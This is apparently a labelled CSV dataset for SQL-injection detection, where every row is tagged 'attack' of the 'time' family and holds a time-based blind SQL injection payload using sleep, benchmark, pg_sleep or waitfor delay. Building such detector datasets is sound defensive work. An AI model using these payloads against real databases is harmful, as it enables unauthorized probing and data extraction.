label,payload,family
attack,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",time
attack,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,time
attack,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,time
attack,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,time
attack,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,time
attack,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,time
attack,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,time
attack,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",time
attack," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",time
attack,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",time
attack,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,time
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,time
attack,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",time
attack,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,time
attack,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",time
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",time
attack,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",time
